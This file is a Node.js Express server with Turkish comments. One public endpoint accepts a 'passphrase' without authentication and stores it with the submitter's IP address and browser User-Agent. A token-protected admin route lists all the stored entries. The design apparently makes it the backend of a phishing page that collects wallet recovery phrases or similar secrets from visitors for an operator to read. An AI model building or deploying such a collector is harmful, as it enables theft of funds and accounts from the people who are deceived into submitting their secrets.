const express = require('express');
const path = require('path');
const dotenv = require('dotenv');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const db = require('./database');

dotenv.config();

const app = express();

// CORS ayarları
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());
app.use(express.static(path.join(__dirname, 'build')));

// Auth middleware
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ success: false, error: 'Yetkilendirme gerekli' });
  }

  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ success: false, error: 'Geçersiz token' });
    }
    req.user = user;
    next();
  });
};

// Login endpoint'i
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  if (username === process.env.ADMIN_USERNAME && password === process.env.ADMIN_PASSWORD) {
    const token = jwt.sign({ username }, process.env.JWT_SECRET, { expiresIn: '1h' });
    res.json({ success: true, token });
  } else {
    res.status(401).json({ success: false, error: 'Geçersiz kullanıcı adı veya şifre' });
  }
});

// Passphrase kaydetme endpoint'i
app.post('/api/save-passphrase', (req, res) => {
  const { passphrase } = req.body;
  
  if (!passphrase) {
    return res.status(400).json({ success: false, error: 'Passphrase gerekli' });
  }

  const uniqueId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  
  db.run(
    'INSERT INTO passphrases (passphrase, ip, userAgent, uniqueId) VALUES (?, ?, ?, ?)',
    [passphrase, req.ip, req.get('User-Agent'), uniqueId],
    function(err) {
      if (err) {
        console.error('Kaydetme hatası:', err);
        return res.status(500).json({ success: false, error: 'Kayıt hatası' });
      }
      console.log('Passphrase kaydedildi:', this.lastID);
      res.json({ success: true });
    }
  );
});

// Admin endpoint'i (korumalı)
app.get('/api/admin/passphrases', authenticateToken, (req, res) => {
  db.all(
    'SELECT * FROM passphrases ORDER BY createdAt DESC',
    [],
    (err, rows) => {
      if (err) {
        console.error('Veri alma hatası:', err);
        return res.status(500).json({ success: false, error: 'Veriler alınamadı' });
      }
      res.json({ success: true, data: rows });
    }
  );
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const port = process.env.PORT || 3001;
app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor`);
});

// Genel hata yakalama
process.on('unhandledRejection', (error) => {
  console.error('Yakalanmamış Promise Reddi:', error);
}); 